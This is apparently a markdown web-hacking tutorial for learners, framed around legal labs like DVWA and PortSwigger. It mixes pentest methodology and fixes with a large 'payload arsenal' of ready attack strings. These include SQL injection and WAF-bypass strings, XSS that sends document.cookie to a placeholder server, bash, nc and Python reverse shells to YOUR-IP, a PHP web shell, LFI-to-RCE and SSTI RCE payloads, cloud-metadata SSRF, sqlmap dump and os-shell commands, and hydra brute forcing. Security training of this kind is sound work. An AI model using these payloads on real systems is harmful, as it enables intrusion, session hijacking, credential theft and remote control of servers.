# 🕸️ WEB HACKING BOOK
> Web apps are the #1 target in the world. Here you learn to break them (legally) and protect them.
> Version 2.0 — BUFFED: real payloads, bypasses and pro methodology. Use it with Burp Suite (`burp`).

---

## ⚠️ Reminder (read it every time)
Everything here is practiced ONLY on: your own lab, **DVWA**, **PortSwigger Web Security Academy** (free and legal), **OWASP Juice Shop**, HackTheBox, or a client with **written permission**. Attacking someone else's web without permission is a **crime** (CFAA / penal codes). These payloads are to learn to **find and fix** flaws — on the right side.

---

## 1. How a web app works (what you attack)

```
[Your browser] ⟷ HTTP/HTTPS ⟷ [Web server] ⟷ [Database]
   Frontend          net          Backend         Data
   HTML/JS/CSS                  PHP/Python/Node    MySQL/etc
```

- **Frontend:** what you see (HTML, CSS, JS). Runs in YOUR browser. **Never trust validations that only live here** — they're bypassed trivially (disable JS, edit the request in Burp).
- **Backend:** the server logic. The REAL security must be here.
- **Database:** users, passwords, data. The big prize.

**The golden rule:** *all user input is dangerous until proven otherwise.* Every parameter, header, cookie, field and URL part is a potential injection point. Your job is to test ALL of them.

**Where to inject (don't forget any):**
- GET parameters (`?id=1`) and POST (body)
- Headers: `User-Agent`, `Referer`, `X-Forwarded-For`, `Host`, `Cookie`
- JSON / XML values in APIs
- File names in uploads
- Any data the app reflects or processes

---

## 2. Your main weapon: Burp Suite

Burp is a **proxy** between your browser and the web: you see and modify **ALL** traffic.

### Quick setup
1. `burp` → "Temporary project" → "Use Burp defaults".
2. **Proxy → Open Browser** (built-in browser, already proxied — easiest).
3. For HTTPS with your normal browser: proxy `127.0.0.1:8080` + install the cert (visit `http://burp`).

### Key tabs
- **Proxy → HTTP history:** everything that happened. Pure gold.
- **Repeater** (Ctrl+R): resend and modify a request a thousand times. **Your #1 tool.**
- **Intruder:** automates attacks (fuzzing, brute force, enumeration).
- **Decoder / Inspector:** encode/decode URL, Base64, hex, HTML.
- **Comparer:** compares two responses (key in blind injection).

### Extensions worth gold (BApp Store)
- **Logger++** — advanced request logging
- **Autorize** — auto-detects IDOR / authorization flaws
- **Param Miner** — discovers hidden parameters and headers
- **Turbo Intruder** — ultra-fast fuzzing
- **JSON Web Tokens (JWT)** — manipulate JWT tokens
- **Active Scan++** — improves the scanner

> **OWASP ZAP** (also available) does the same, free and open source.

---

## 3. Web pentest methodology (the order that works)

### Phase 1 — Reconnaissance
```bash
whatweb http://target                 # technologies (CMS, framework, language)
nmap -sV -p80,443,8080,8443 target    # web services
curl -sI http://target                # headers (Server, X-Powered-By)
```
Look at the source (Ctrl+U), comments, `robots.txt`, `sitemap.xml`, `/.git/`, `/.env`.

### Phase 2 — Discover hidden content (directory fuzzing)
```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302,403 -e .php,.bak,.old
feroxbuster -u http://target --depth 2          # automatic recursive
```
Look for: `/admin`, `/backup`, `/api`, `/.git`, `/config`, `/test`, `.bak`, `.old`, `.zip`.

### Phase 3 — Automatic scanning
```bash
nikto -h http://target                # known issues
nuclei -u http://target -severity medium,high,critical    # CVE templates
```

### Phase 4 — Manual exploitation with Burp
Capture interesting requests → Repeater → test each injection. **The payload arsenal is below.**

### Phase 5 — Document
Each finding: what it is, how to reproduce it (step by step), the impact, and how to fix it. The **report** is the pentester's final product.

---

# 🔫 PAYLOAD ARSENAL

> This is the "PayloadsAllTheThings" part. Ready payloads to detect and exploit. Try them in order: detect first, then exploit.

## 4. SQL Injection (SQLi)

**What it is:** injecting SQL into a field to manipulate the database.

### Detection (is it vulnerable?)
```sql
'                          → if it breaks/errors, possible SQLi
''
`
"
1' AND '1'='1              → true (normal page)
1' AND '1'='2              → false (page changes) = vulnerable!
1 AND 1=1
1 AND 1=2
```

### Login bypass (authentication)
```sql
admin' --
admin' #
admin'/*
' OR '1'='1
' OR '1'='1' --
' OR 1=1 --
admin' OR '1'='1' #
') OR ('1'='1
```

### UNION-based (extract data)
```sql
' ORDER BY 1--          (increase the number until it errors = # of columns)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT user(),database()--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT username,password FROM users--
```

### Blind (boolean or time-based)
```sql
' AND 1=1--                      (boolean: true)
' AND 1=2--                      (boolean: false)
' AND SLEEP(5)--                 (MySQL: if it takes 5s, vulnerable)
'; WAITFOR DELAY '0:0:5'--       (MSSQL)
' AND pg_sleep(5)--              (PostgreSQL)
```

### Automation with sqlmap
```bash
sqlmap -u "http://target/item?id=1" --batch --dbs              # databases
sqlmap -u "http://target/item?id=1" -D shop --tables           # tables
sqlmap -u "http://target/item?id=1" -D shop -T users --dump    # dump users!
sqlmap -r request.txt --batch --dump                           # from a saved Burp request
sqlmap -u "..." --os-shell                                     # shell on the server (if possible)
```

### Filter/WAF bypass
```sql
'/**/OR/**/1=1--          (comments instead of spaces)
'%09OR%091=1--            (URL-encoded tabs)
' OR 1=1#                 (# instead of --)
'+OR+'1'='1               (+ as space)
UnIoN SeLeCt              (mixed case if it filters "union select")
UNIONUNION SELECTSELECT   (doubled word if it strips it once)
```

**Defense:** parameterized queries (prepared statements) ALWAYS. ORM. Input validation. Least privilege in the DB. WAF as an extra layer, never the only one.

---

## 5. Cross-Site Scripting (XSS)

**What it is:** injecting JavaScript that runs in OTHER users' browsers.

**Types:** Reflected (in the URL), Stored (saved in DB, the worst), DOM-based (in client-side JS).

### Detection
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
<svg onload=alert(1)>
```

### Filter bypass (when `<script>` is blocked)
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<a href="javascript:alert(1)">click</a>
<img src=x onerror="alert`1`">           (backticks instead of parens)
<scr<script>ipt>alert(1)</scr</script>ipt>   (nested tag)
```

### Polyglot (works in many contexts)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/onload=alert()//>\x3e
```

### Real exploitation (steal the session)
```html
<script>fetch('https://YOUR-SERVER/?c='+document.cookie)</script>
<script>new Image().src='https://YOUR-SERVER/?c='+document.cookie</script>
```
(Set up a listener with `nc -lvnp 80` or a webhook to receive the cookie.)

**Defense:** escape/sanitize ALL output by context (HTML, attribute, JS, URL). **Content-Security-Policy (CSP).** Cookies with `HttpOnly` (JS can't read them) + `Secure` + `SameSite`.

---

## 6. Command Injection

**What it is:** the app passes your input to a system command → you run commands on the server.

### Detection and exploitation
```bash
; id
| id
|| id
& id
&& id
` id `
$(id)
%0a id              (newline)
; ping -c 4 YOUR-IP (if you get pings, there's blind execution)
```

### Filter bypass
```bash
;l''s              (quotes in the middle)
;l\s               (backslash)
;cat${IFS}/etc/passwd     (${IFS} = space)
;cat</etc/passwd
```

### Reverse shell (once you confirm execution)
```bash
; bash -i >& /dev/tcp/YOUR-IP/4444 0>&1
; nc -e /bin/bash YOUR-IP 4444
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
```
(Receive with `nc -lvnp 4444`. **Only on YOUR lab.**)

**Defense:** NEVER pass user input to system commands. Use native APIs/libraries. If unavoidable, strict allowlists and escaping.

---

## 7. Path Traversal & LFI/RFI (read server files)

**What it is:** breaking out of the allowed directory to read system files (LFI) or include remote files (RFI).

### Path traversal / LFI
```
../../../../etc/passwd
....//....//....//etc/passwd        (bypass a filter that strips ../ once)
..%2f..%2f..%2fetc%2fpasswd         (URL-encoded)
/etc/passwd%00                      (null byte, on old systems)
```

### PHP wrappers (LFI to RCE)
```
php://filter/convert.base64-encode/resource=index.php    (read source code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   (execute code)
expect://id
```

### Juicy files to read
```
/etc/passwd            /etc/shadow         /etc/hosts
/var/log/apache2/access.log    (log poisoning → RCE)
/proc/self/environ
~/.ssh/id_rsa          ~/.bash_history
config.php  wp-config.php  .env  settings.py
```

**Defense:** never use user input in file paths. Allowlists. `basename()`. Disable `allow_url_include`.

---

## 8. File Upload (upload a web shell)

**What it is:** uploading a malicious file (e.g. a PHP web shell) when validation is weak.

### Minimal web shell (PHP)
```php
<?php system($_GET['cmd']); ?>
```
Then you call it: `http://target/uploads/shell.php?cmd=id`

### Extension validation bypass
```
shell.php          → if blocked, try:
shell.phtml  shell.php3  shell.php4  shell.php5  shell.phar
shell.pHp          (mixed case)
shell.php.jpg      (double extension)
shell.php%00.jpg   (null byte)
shell.jpg + change Content-Type to image/jpeg in Burp
```
- **Magic bytes:** add `GIF89a;` at the start to pass as an image
- If it validates `Content-Type`, change it in Burp to `image/png`

**Defense:** extension allowlist, validate real content (not just extension), rename files, store outside webroot, no execute permissions.

---

## 9. SSRF (Server-Side Request Forgery)

**What it is:** making the SERVER make requests for you, reaching internal things you can't see.

### Payloads
```
http://localhost/admin
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/        (AWS cloud metadata — steal credentials)
http://metadata.google.internal/                 (GCP)
file:///etc/passwd
http://127.0.0.1:6379                             (internal Redis)
```

### Filter bypass
```
http://127.0.0.1   →   http://127.1   http://0177.0.0.1   http://2130706433   (decimal)
http://localhost   →   http://[::1]   http://0.0.0.0
http://burpcollaborator.net   (to confirm blind SSRF)
```

**Defense:** destination allowlist, block internal/metadata IPs, don't follow redirects, disable dangerous protocols (`file://`, `gopher://`).

---

## 10. XXE (XML External Entity)

**What it is:** when the app processes XML, injecting entities to read files or do SSRF.

### Payload (read /etc/passwd)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### XXE for SSRF
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
<foo>&xxe;</foo>
```

**Defense:** disable external entities and DTDs in the XML parser. Use JSON if possible.

---

## 11. SSTI (Server-Side Template Injection)

**What it is:** injecting into a template engine (Jinja2, Twig, etc.) → can lead to RCE.

### Detection
```
${7*7}        {{7*7}}        <%= 7*7 %>        #{7*7}
```
If you see `49`, there's SSTI.

### Exploitation (Jinja2 / Python → RCE)
```
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Defense:** don't pass user input to templates. Sandbox the engine. Use logic templates, not string ones.

---

## 12. IDOR & authorization flaws

**What it is:** accessing others' data by changing an identifier.

```
GET /profile?id=1001   →   change to id=1002, id=1000...
GET /api/user/123      →   /api/user/124
GET /invoice/00045     →   /invoice/00046
```
Also try: changing your role in the body (`"role":"user"` → `"role":"admin"`), IDs in cookies/JWT.
**Tip:** Burp's **Autorize** extension detects it automatically.

**Defense:** verify authorization on EVERY server-side request (can this user view/edit THIS resource?).

---

## 13. CSRF & Broken Authentication

**CSRF:** tricking a logged-in victim's browser into performing an action.
```html
<img src="http://bank.com/transfer?to=attacker&amount=1000">
<form action="http://bank.com/change-pass" method="POST">
  <input name="password" value="hacked123"></form><script>document.forms[0].submit()</script>
```
**Defense:** unique CSRF tokens per form + `SameSite=Strict` cookies.

**Broken auth:** login brute force, credential stuffing, predictable sessions.
```bash
hydra -l admin -P /opt/wordlists/rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:incorrect"
```
Or Burp's **Intruder**. **Defense:** 2FA, rate limits, bcrypt/argon2, random session tokens.

---

## 14. WAF bypass (general techniques)

When a Web Application Firewall blocks your payloads:
- **Encoding:** URL-encode, double URL-encode, Unicode, HTML entities
- **Comments:** `/**/` in SQL, `<!-- -->`
- **Mixed case:** `SeLeCt`, `ScRiPt`
- **Alternative spaces:** tabs (`%09`), newlines (`%0a`), `${IFS}`, `/**/`, `+`
- **Doubled word:** `UNIONUNION` (if it strips "UNION" once)
- **Fragmentation:** split the payload across parameters
- **Change method:** GET ↔ POST, JSON ↔ form-data

---

## 15. Your lab (practice ALL this legally)

**DVWA with Docker:**
```bash
docker run --rm -it -p 8080:80 vulnerables/web-dvwa
# http://localhost:8080 — admin / password
```

Others (free):
- **PortSwigger Web Security Academy** — the BEST, guided labs for EVERY vulnerability in this book
- **OWASP Juice Shop** — modern vulnerable web (JS)
- **bWAPP, WebGoat, HackTheBox**

**Plan:** DVWA on "Low" → practice each payload above with Burp → raise to "Medium" → "High". In weeks you master the OWASP Top 10 with your own hands.

---

## 🎓 To continue
- **PortSwigger Web Security Academy** — finish it, it's gold and free.
- **PayloadsAllTheThings** (github.com/swisskyrepo/PayloadsAllTheThings) — the world reference of payloads, keep it handy.
- **Bug bounty:** HackerOne / Bugcrowd **pay** to find real bugs, legally.
- **Continue with:** `book-networking.md`, `book-python-hacking.md` (automate your attacks) and `book-cybersecurity.md`.

> ⬛ *Every text field is a question from the server. Learn to answer with something it didn't expect — then teach how to close it.*
